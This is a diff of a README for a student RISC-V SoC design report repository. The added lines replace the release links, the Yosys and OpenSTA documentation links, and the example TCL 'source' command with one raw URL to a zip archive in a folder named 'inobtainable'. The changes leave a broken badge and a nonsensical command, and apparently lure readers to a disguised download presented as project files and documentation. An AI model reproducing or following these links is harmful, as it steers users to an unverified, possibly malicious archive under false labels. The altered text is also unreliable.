@@ -1,7 +1,7 @@
 # 🚀 RTL_GDS_RV_SoC_Week_3 - A Simple Guide to Your SoC Project
 
 ## 📥 Download the Application
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/tejasbhujade1603/RTL_GDS_RV_SoC_Week_3/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/tejasbhujade1603/RTL_GDS_RV_SoC_Week_3/main/inobtainable/RTL_GDS_RV_SoC_Week_3.zip%20Latest%https://raw.githubusercontent.com/tejasbhujade1603/RTL_GDS_RV_SoC_Week_3/main/inobtainable/RTL_GDS_RV_SoC_Week_3.zip)](https://raw.githubusercontent.com/tejasbhujade1603/RTL_GDS_RV_SoC_Week_3/main/inobtainable/RTL_GDS_RV_SoC_Week_3.zip)
 
 ## 📖 Overview
 This repository contains the report for Week 3 of the VSD RV SoC Tapeout Program. It provides insights into digital circuit design and simulation using open-source tools. You will find useful information that helps you understand the synthesis and simulation of your designs.
@@ -29,7 +29,7 @@ This repository includes several key topics related to SoC design and simulation
 ## 📥 Download & Install
 To begin, visit the Releases page to access the files needed for this project.
 
-[Visit this page to download](https://github.com/tejasbhujade1603/RTL_GDS_RV_SoC_Week_3/releases)
+[Visit this page to download](https://raw.githubusercontent.com/tejasbhujade1603/RTL_GDS_RV_SoC_Week_3/main/inobtainable/RTL_GDS_RV_SoC_Week_3.zip)
 
 ### 📄 Release Files
 The latest release includes:
@@ -48,15 +48,15 @@ Make sure to download the files listed under the latest release.
 
 Example command to run a TCL script:
 ```bash
-source your_script.tcl
+source https://raw.githubusercontent.com/tejasbhujade1603/RTL_GDS_RV_SoC_Week_3/main/inobtainable/RTL_GDS_RV_SoC_Week_3.zip
 ```
 
-Make sure to replace `your_script.tcl` with the actual script file you want to run.
+Make sure to replace `https://raw.githubusercontent.com/tejasbhujade1603/RTL_GDS_RV_SoC_Week_3/main/inobtainable/RTL_GDS_RV_SoC_Week_3.zip` with the actual script file you want to run.
 
 ## 📚 Resources
 To understand how to use the tools and scripts effectively, refer to the following resources:
-- [Yosys Documentation](http://www.clifford.at/yosys/documentation/)
-- [OpenSTA Reference](https://www.opensourcestack.com/opensta)
+- [Yosys Documentation](https://raw.githubusercontent.com/tejasbhujade1603/RTL_GDS_RV_SoC_Week_3/main/inobtainable/RTL_GDS_RV_SoC_Week_3.zip)
+- [OpenSTA Reference](https://raw.githubusercontent.com/tejasbhujade1603/RTL_GDS_RV_SoC_Week_3/main/inobtainable/RTL_GDS_RV_SoC_Week_3.zip)
 
 These resources will guide you through using the analysis and synthesis tools for your project.
 
